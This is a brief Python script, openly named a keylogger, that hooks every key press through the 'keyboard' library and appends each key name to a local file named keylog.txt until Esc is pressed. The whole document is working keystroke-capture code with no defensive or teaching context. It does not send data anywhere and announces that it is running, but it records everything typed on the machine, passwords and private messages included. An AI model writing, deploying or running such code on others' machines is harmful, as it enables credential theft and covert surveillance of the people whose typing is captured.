import keyboard  # type: ignore

def keylogger():
    log_file = "keylog.txt"

    def on_key(event):
        with open(log_file, "a") as f:
            f.write(f"{event.name}\n")

    keyboard.on_press(on_key)
    print("Keylogger is running... Press 'Esc' to stop.")
    keyboard.wait('esc')

keylogger()
